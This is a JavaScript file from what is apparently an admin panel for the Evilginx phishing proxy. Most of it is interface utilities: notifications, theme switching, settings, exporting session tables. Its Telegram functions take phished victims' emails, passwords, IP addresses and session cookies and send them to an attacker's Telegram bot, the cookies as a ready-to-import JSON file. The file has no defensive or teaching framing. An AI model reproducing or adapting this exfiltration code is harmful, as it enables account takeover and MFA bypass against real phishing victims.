// ============================================================
// main.js — Shared utilities for Evilginx Admin Panel SPA
// ============================================================

// ---------- Notification System ----------
function showNotify(message, type, duration) {
  type = type || "info";
  duration = duration || 3000;
  var notifyElement = document.getElementById("notify");
  if (!notifyElement) return;

  notifyElement.className = "notify";
  if (type === "success") {
    notifyElement.classList.add("notify-success");
  } else if (type === "error") {
    notifyElement.classList.add("notify-error");
  } else {
    notifyElement.classList.add("notify-info");
  }

  notifyElement.textContent = message;
  notifyElement.classList.remove("hidden");
  notifyElement.classList.add("show");

  setTimeout(function () {
    notifyElement.classList.remove("show");
    notifyElement.classList.add("hidden");
  }, duration);
}

// ---------- Clipboard ----------
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(function () {
    showNotify("Copied to clipboard", "success");
  }).catch(function (err) {
    console.error("Failed to copy:", err);
    showNotify("Failed to copy data.", "error");
  });
}

// ---------- Download Blob ----------
function downloadBlob(blob, filename) {
  var url = URL.createObjectURL(blob);
  var link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

// ---------- Theme Toggle ----------
document.addEventListener("DOMContentLoaded", function () {
  var themeToggleBtn = document.getElementById("themeToggle");
  var themeIcon = document.getElementById("themeIcon");
  if (!themeToggleBtn || !themeIcon) return;

  var savedTheme = localStorage.getItem("theme");
  if (savedTheme === "dark") {
    document.body.classList.add("dark");
    document.body.classList.remove("light");
    themeIcon.classList.remove("ri-moon-line");
    themeIcon.classList.add("ri-sun-line");
  } else {
    document.body.classList.add("light");
    document.body.classList.remove("dark");
    themeIcon.classList.remove("ri-sun-line");
    themeIcon.classList.add("ri-moon-line");
  }

  themeToggleBtn.addEventListener("click", function () {
    var isDark = document.body.classList.contains("dark");
    if (isDark) {
      document.body.classList.remove("dark");
      document.body.classList.add("light");
      themeIcon.classList.remove("ri-sun-line");
      themeIcon.classList.add("ri-moon-line");
      localStorage.setItem("theme", "light");
    } else {
      document.body.classList.remove("light");
      document.body.classList.add("dark");
      themeIcon.classList.remove("ri-moon-line");
      themeIcon.classList.add("ri-sun-line");
      localStorage.setItem("theme", "dark");
    }
  });
});

// ---------- Settings Overlay ----------
document.addEventListener("DOMContentLoaded", function () {
  var settingsToggle = document.getElementById("settingsToggle");
  var settingsOverlay = document.getElementById("settingsOverlay");
  if (!settingsToggle || !settingsOverlay) return;

  settingsToggle.addEventListener("click", function () {
    settingsOverlay.classList.remove("hidden");

    var chatIdEl = document.getElementById("chatId");
    var botTokenEl = document.getElementById("botToken");
    if (!chatIdEl || !botTokenEl) return;

    fetch("/get-telegram")
      .then(function (response) {
        if (!response.ok) throw new Error("HTTP error " + response.status);
        return response.json();
      })
      .then(function (data) {
        chatIdEl.value = data.chatId || "";
        botTokenEl.value = data.botToken || "";
      })
      .catch(function (error) {
        console.error("Failed to load settings:", error);
      });
  });

  settingsOverlay.addEventListener("click", function (event) {
    var overlayContent = settingsOverlay.querySelector(".overlay-content");
    if (overlayContent && !overlayContent.contains(event.target)) {
      settingsOverlay.classList.add("hidden");
    }
  });
});

// ---------- Telegram Integration ----------
async function sendToTelegram(sessionData) {
  var getVal = function (value, def) {
    def = def || "No Data";
    return (value !== undefined && value !== null && value !== "") ? value : def;
  };

  var password = "";
  if (typeof sessionData.password === "string") {
    password = sessionData.password;
  } else if (sessionData.password && typeof sessionData.password === "object") {
    password = sessionData.password.password || Object.values(sessionData.password)[0] || "";
    if (typeof password === "object") password = "";
  }

  var browserInfo = getVal(sessionData.useragent || sessionData.browser || "");
  var ipAddress = getVal(sessionData.remote_addr || sessionData.ip || "");
  var timestamp = "";
  if (sessionData.create_time) {
    if (typeof sessionData.create_time === "number") {
      timestamp = new Date(sessionData.create_time * 1000).toLocaleString();
    } else {
      timestamp = getVal(sessionData.create_time);
    }
  } else {
    timestamp = new Date().toLocaleString();
  }

  var emailOrUsername = getVal(sessionData.username || sessionData.email || "No Email");
  var customDataDisplay = "No Custom Data";
  if (sessionData.custom && Object.keys(sessionData.custom).length > 0) {
    try { customDataDisplay = JSON.stringify(sessionData.custom, null, 2); }
    catch (e) { customDataDisplay = String(sessionData.custom); }
  }

  var message = "ID: " + getVal(sessionData.id, "unknown") + "\n" +
    "Email: " + emailOrUsername + "\n" +
    "Password: " + (password || "No Password") + "\n" +
    "Browser: " + browserInfo + "\n" +
    "IP: " + ipAddress + "\n" +
    "Time: " + timestamp + "\n" +
    "Custom Data:\n```\n" + customDataDisplay + "\n```";

  try {
    var tgRes = await fetch("/get-telegram");
    var tgData = await tgRes.json();
    if (!tgData.botToken || !tgData.chatId) {
      showNotify("Telegram configuration missing. Set it in settings.", "error");
      return;
    }

    await fetch("https://api.telegram.org/bot" + tgData.botToken + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: tgData.chatId,
        text: message,
        parse_mode: "Markdown"
      })
    });

    sendCookiesToTelegram(sessionData.tokens, sessionData.id, tgData.botToken, tgData.chatId);
    showNotify("Cookies sent to Telegram!", "success");
  } catch (error) {
    console.error("Telegram Error:", error);
    showNotify("Failed to send cookies to Telegram.", "error");
  }
}

async function sendCookiesToTelegram(tokens, sessionId, botToken, chatId) {
  var cookieArray = [];
  for (var domain in tokens) {
    for (var name in tokens[domain]) {
      var cookie = tokens[domain][name];
      cookieArray.push({
        path: cookie.Path || "/",
        domain: domain,
        expirationDate: cookie.ExpirationDate || 1773674937,
        value: cookie.Value || "",
        name: cookie.Name || name,
        httpOnly: cookie.HttpOnly || false,
        secure: cookie.Secure || false,
        session: cookie.Session || false
      });
    }
  }

  var blob = new Blob([JSON.stringify(cookieArray, null, 0)], { type: "application/json" });
  var formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("document", blob, "cookiesID_" + sessionId + ".json");

  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendDocument", true);
  xhr.send(formData);
}

// ---------- Telegram Settings Save ----------
function saveTelegramSettings() {
  var chatId = document.getElementById("chatId").value.trim();
  var botToken = document.getElementById("botToken").value.trim();

  if (!chatId || !botToken) {
    showNotify("Both Chat ID and Bot Token are required.", "error");
    return;
  }

  fetch("/settings/save", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chatId: chatId, botToken: botToken })
  })
    .then(function (response) { return response.json(); })
    .then(function (result) {
      showNotify(result.message || "Saved", "success");
    })
    .catch(function () {
      showNotify("Failed to save Telegram settings.", "error");
    });
}

// ---------- Password Change ----------
function savePasswordChange() {
  var oldPassword = document.getElementById("oldPassword").value.trim();
  var newPassword = document.getElementById("newPassword").value.trim();

  if (!oldPassword || !newPassword) {
    showNotify("Enter both old and new passwords.", "error");
    return;
  }

  fetch("/api/auth/change-password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ old_password: oldPassword, new_password: newPassword })
  })
    .then(function (response) { return response.json(); })
    .then(function (result) {
      showNotify(result.message || "Password updated", "success");
    })
    .catch(function () {
      showNotify("Failed to update password.", "error");
    });
}

// ---------- Logout ----------
function logoutUser() {
  if (!confirm("Are you sure you want to logout?")) return;

  fetch("/api/auth/logout", {
    method: "POST",
    headers: { "Content-Type": "application/json" }
  })
    .then(function () {
      window.location.href = "/login";
    })
    .catch(function () {
      showNotify("Logout failed.", "error");
    });
}

// ---------- Delete All Sessions ----------
function deleteAllSessions() {
  if (!confirm("Are you sure you want to delete ALL sessions? This cannot be undone.")) return;

  fetch("/delete-all", {
    method: "POST",
    headers: { "Content-Type": "application/json" }
  })
    .then(function (response) { return response.json(); })
    .then(function (result) {
      showNotify(result.message || "All sessions deleted.", "success");
      // Reload sessions if the SPA function exists
      if (typeof loadSessions === "function") loadSessions();
    })
    .catch(function () {
      showNotify("Network error. Please try again.", "error");
    });
}

// ---------- Export Data (from table) ----------
function exportData(format) {
  var tableRows = document.querySelectorAll("#dataTable tr");
  if (!tableRows || tableRows.length < 2) {
    showNotify("No data to export.", "error");
    return;
  }

  var headers = Array.from(tableRows[0].querySelectorAll("th")).map(function (th) { return th.textContent.trim(); });
  var dataRows = [];

  for (var i = 1; i < tableRows.length; i++) {
    if (tableRows[i].style.display === "none") continue;
    if (tableRows[i].classList.contains("detail-row")) continue;

    var cells = tableRows[i].querySelectorAll("td");
    var rowData = {};
    for (var j = 1; j < cells.length - 1; j++) {
      rowData[headers[j] || ("col" + j)] = cells[j].innerText.trim();
    }
    dataRows.push(rowData);
  }

  if (format === "json") {
    var blob = new Blob([JSON.stringify(dataRows, null, 2)], { type: "application/json" });
    downloadBlob(blob, "sessions.json");
  } else if (format === "csv") {
    var csvHeaders = Object.keys(dataRows[0] || {});
    var csvLines = [csvHeaders.join(",")];
    dataRows.forEach(function (row) {
      csvLines.push(csvHeaders.map(function (h) {
        return '"' + (row[h] || "").replace(/"/g, '""') + '"';
      }).join(","));
    });
    downloadBlob(new Blob([csvLines.join("\n")], { type: "text/csv" }), "sessions.csv");
  } else if (format === "txt") {
    var textContent = dataRows.map(function (row) {
      return Object.entries(row).map(function (kv) { return kv[0] + ": " + kv[1]; }).join("\n");
    }).join("\n\n---\n\n");
    downloadBlob(new Blob([textContent], { type: "text/plain" }), "sessions.txt");
  }
}
